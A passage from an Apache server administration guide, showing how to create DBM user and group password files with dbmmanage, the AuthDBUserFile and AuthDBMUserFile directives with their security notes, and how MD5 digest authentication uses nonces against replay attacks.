 
 

 
 
Copyright 
    
 
Preface 
       
 
Who Wrote Apache, and Why? 
       
 
The Demonstration Code 
       
 
Conventions Used in This Book  
       
 
Organization of This Book 
       
 
Acknowledgments 
    
    
 
Chapter 1.  Getting Started 
So, to add our four users to a file /usr/www/APACHE3/ok_dbm/users, we type:  
% dbmmanage /usr/www/APACHE3/ok_dbm/users.db adduser bill  
New password:theft 
Re-type new password:theft 
User bill added with password encrypted to vJACUCNeAXaQ2 using crypt 
Perform the same service for ben, sonia, and daphne. The file ... /users is not editable 
directly, but you can see the results by typing:  
% dbmmanage /usr/www/APACHE3/ok_dbm/users view 
bill:vJACUCNeAXaQ2 
ben:TPsuNKAtLrLSE 
sonia:M9x731z82cfDo 
daphne:7DBV6Yx4.vMjc 
You can build a group file with dbmmanage,but because of faults in the script that we 
hope will have been rectified by the time readers of this edition use it, the results seem a 
bit odd. To add the user fred to the group cleaners, type:  
% dbmmanage /usr/www/APACHE3/ok_dbm/group add fred cleaners 
(Note: do not use adduser.) dbmmanagerather puzzlingly responds with the following 
message:  
User fred added with password encrypted to cleaners using crypt 
When we test this with: 
% dbmmanage /usr/www/APACHE3/ok_dbm/group view 
we see: 
fred:cleaners 

which is correct, because in a group file the name of the group goes where the encrypted 
password would go in a password file.  
Since we have a similar file structure, we invoke DBM authentication in ... 
/conf/httpd.conf by commenting out:  
#AuthUserFile /usr/www/APACHE3/ok_users/sales 
#AuthGroupFile /usr/www/APACHE3/ok_users/groups 
and inserting: 
AuthDBMUserFile /usr/www/APACHE3/ok_dbm/users  
AuthDBMGroupFile /usr/www/APACHE3/ok_dbm/users 
AuthDBMGroupFile is set to the samefile as the AuthDBMUserFile. What happens is that 
the username becomes the key in the DBM file, and the value associated with the key is 
password:group. To create a separate group file, a database with usernames as the key 
and groups as the value (with no colons in the value) would be needed.  
5.10.1 AuthDBUserFile 
The AuthDBUserFile directive sets the name of a DB file containing the list of users and 
passwords for user authentication.  
AuthDBUserFile filename 
directory, .htaccess 
filename is the absolute path to the user file.  
The user file is keyed on the username. The value for a user is the crypt( )-encrypted 
password, optionally followed by a colon and arbitrary data. The colon and the data 
following it will be ignored by the server.  
5.10.1.1 Security 
Make sure that the AuthDBUserFile is stored outside the document tree of the web 
server; do not put it in the directory that it protects. Otherwise, clients will be able to 
download the AuthDBUserFile.  
 
In regards to compatibility, the implementation of dbmopen in the 
Apache modules reads the string length of the hashed values from 
the DB data structures, rather than relying upon the string being 
NULL-appended. Some applications, such as the Netscape web 
server, rely upon the string being NULL-appended, so if you are 
having trouble using DB files interchangeably between applications, 
this may be a part of the problem.  
 

A perl script called dbmmanage is included with Apache. This program can be used to 
create and update DB-format password files for use with this module.  
5.10.2 AuthDBMUserFile 
The AuthDBMUserFile directive sets the name of a DBM file containing the list of users 
and passwords for user authentication.  
AuthDBMUserFile filename 
directory, .htaccess 
filename is the absolute path to the user file.  
The user file is keyed on the username. The value for a user is the crypt( )-encrypted 
password, optionally followed by a colon and arbitrary data. The colon and the data 
following it will be ignored by the server.  
5.10.2.1 Security 
Make sure that the AuthDBMUserFile is stored outside the document tree of the web 
server; do not put it in the directory that it protects. Otherwise, clients will be able to 
download the AuthDBMUserFile.  
 
In regards to compatibility, the implementation of dbmopen in the 
Apache modules reads the string length of the hashed values from 
the DBM data structures, rather than relying upon the string being 
NULL-appended. Some applications, such as the Netscape web 
server, rely upon the string being NULL-appended, so if you are 
having trouble using DBM files interchangeably between 
applications, this may be a part of the problem.  
 
A perl script called dbmmanage is included with Apache. This program can be used to 
create and update DBM-format password files for use with this module.  
5.11 Digest Authentication 
A halfway house between complete encryption and none at all is digest authentication. 
The idea is that a one-way hash, or digest, is calculated from a password and various 
other bits of information. Rather than sending the lightly encoded password, as is done in 
basic authentication, the digest is sent. At the other end, the same function is calculated: 
if the numbers are not identical, something is wrong — and in this case, since all other 
factors should be the same, the "something" must be the password.  
Digest authentication is applied in Apache to improve the security of passwords. MD5 is 
a cryptographic hash function written by Ronald Rivest and distributed free by RSA Data 

Security; with its help, the client and server use the hash of the password and other stuff. 
The point of this is that although many passwords lead to the same hash value, there is a 
very small chance that a wrong password will give the right hash value, if the hash 
function is intelligently chosen; it is also very difficult to construct a password leading to 
the same hash value (which is why these are sometimes referred to as one-way hashes). 
The advantage of using the hash value is that the password itself is not sent to the server, 
so it isn't visible to the Bad Guys. Just to make things more tiresome for them, MD5 adds 
a few other things into the mix: the URI, the method, and a nonce. A nonce is simply a 
number chosen by the server and told to the client, usually different each time. It ensures 
that the digest is different each time and protects against replay attacks.[2] The digest 
function looks like this:  
MD5(MD5(<password>)+":"+<nonce>+":"+MD5(<method>+":"+<uri>)) 
MD5 digest authentication can be invoked with the following line:  
AuthType Digest 
This plugs a nasty hole in the Internet's security. As we saw earlier — and almost 
unbelievably — the authentication procedures discussed up to now send the user's 
password in barely encoded text across the Web. A Bad Guy who intercepts the Internet 
traffic then knows the user's password. This is a Bad Thing.  
You can either use SSL (see Chapter 11) to encrypt the password or Digest 
Authentication. Digest authentication works this way:  
1. The client requests a URL.  
2. Because that URL is protected, the server replies with error 401, "Authentication 
required," and among the headers, it sends a nonce.  
3. The client combines the user's password, the nonce, the method, and the URL, as 
described previously, then sends the result back to the server. The server does the 
same thing with the hash of the user's password retrieved from the password file 
and checks that its result matches.[3]  
A different nonce is sent the next time, so that the Bad Guy can't use the captured digest 
to gain access.  
MD5 digest authentication is implemented in Apache, using mod_auth_digest, for two 
reasons. First, it provides one of the two fully compliant reference HTTP 1.1 
implementations required for the standard to advance down the standards track; second, it 
provides a test bed for browser implementations. It should only be used for experimental 
purposes, particularly since it makes no effort to check that the returned nonce is the 
same as the one it chose in the first place.[4] This makes it susceptible to a replay attack.  
